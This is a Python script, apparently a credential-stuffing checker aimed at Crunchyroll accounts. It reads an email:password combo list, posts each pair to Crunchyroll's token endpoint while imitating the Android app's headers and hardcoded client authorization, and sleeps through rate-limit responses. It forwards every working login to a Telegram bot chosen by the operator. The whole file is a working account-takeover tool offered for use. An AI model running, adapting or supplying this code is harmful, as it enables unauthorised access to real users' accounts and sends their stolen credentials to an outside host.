import requests
import random
import os
import pyfiglet
import time
from user_agent import generate_user_agent
from colorama import Fore, Style, init

# Initialize colorama
init()

# Colors
GREY = Fore.LIGHTBLACK_EX  # Light grey
RED = Fore.RED  # Red
GREEN = Fore.GREEN  # Green
BLUE = Fore.BLUE  # Blue
RESET = Style.RESET_ALL

device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))

# Print single banner
def print_banner(title):
    os.system('clear')
    print(GREY)
    print(pyfiglet.figlet_format(title, font='slant') + f"{GREEN}                       Github: SPARUX-666 </>\n")
    print(f"{GREEN}{'━'*67}{RESET}")

print_banner('Crunchyroll')

tok = input(f' {BLUE}— TOKEN BOT: {GREY}')
ID = input(f' {BLUE}— YOUR ID: {GREY}')

file_name = input(f' {BLUE}— FILE PATH: {GREY}')
print(f"{GREEN}{'━'*67}{RESET}")
file = open(file_name).read().splitlines()

for xx in file:
    if ":" in xx:
        email = xx.split(':')[0]
        pasw = xx.split(':')[1]
        
        url = "https://beta-api.crunchyroll.com/auth/v1/token" 
        
        headers = {
            "host": "beta-api.crunchyroll.com",
            "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
            "x-datadog-sampling-priority": "0",
            "etp-anonymous-id": "855240b9-9bde-4d67-97bb-9fb69aa006d1",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "Crunchyroll/3.59.0 Android/14 okhttp/4.12.0"
        }
        
        data = {
            "username": email,
            "password": pasw,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": device_id,
            "device_name": "SM-G9810",
            "device_type": "samsung SM-G955N"
        }
        
        res = requests.post(url, data=data, headers=headers)
        
        if "refresh_token" in res.text:
            print(f'{GREEN} 𝘨𝘰𝘰𝘥 ☑️  >>>> [ {email} | {pasw} ]{RESET}')
            requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={email}:{pasw}')
        
        elif "406 Not Acceptable" in res.text:
            print(f"\n\n{res.text}\n\n")
            print(' Wait 5min ❗')
            time.sleep(300)
            
        else:
            print(f'{RED} 𝘦𝘳𝘳𝘰𝘳 ❌ >>>> [ {email} | {pasw} ]{RESET}')
            time.sleep(6)
